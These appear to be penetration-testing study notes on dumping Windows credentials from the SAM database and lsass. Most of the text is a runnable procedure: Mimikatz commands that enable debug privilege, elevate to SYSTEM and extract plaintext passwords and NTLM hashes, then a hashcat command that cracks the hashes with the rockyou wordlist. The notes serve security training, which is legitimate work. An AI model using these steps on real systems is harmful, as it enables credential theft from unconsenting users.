
#### SAM and LSASS

SAM database is located at `C:\Windows\system32\config\sam` - it is locked at the kernel level, we cannot copy or remove it.

We can use `Mimikatz` to bypass the restrictions placed on SAM by extracting plaintext passwords and hashes from various sources in windows. `Mimikatz` also includes the `sekurlsa` module which extracts password hashes from lsass.

`lsass` is a process responsible user authentication, password changes and access token creation. `lsass` runs under the `system user` so it is higher privileged than an Administrator.

`We can only extract passwords from lsass if we run mimikatz as an administrative user. We also need the SeDebugPrivilege access right enabled`

We can escalate to to SYSTEM account using `PsExec` or Mimikatz `token evaluation function` which requires `SeImpersonatePrivilege` access right (which all local admins have by default)

#### Extracting NTLM hashes

`Get-LocalUser` - check which users exist on the system

`.\mimikatz.exe` run Mimikatz in an administrative powershell (UAC will pop up, you will need to by pass this if no rdp session is available)

`privilege::debug` - enable debug privilege necessary for extracting from lsass

`sekurlsa::logonpasswords` - attempts to extract plaintext passwords and hashes from all available sources (massive amount of output use lsadump instead)

`token::elevate` elevate to system so we can extract from SAM
`lsadump::sam` extract the NTLM hashes from the SAM and take note of `Hash NTLM` outputs

#### Cracking NTLM

`hashcat --help | grep -i "ntlm"` - check for code used to crack NTLM

`hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force` example of cracking NTLM hash



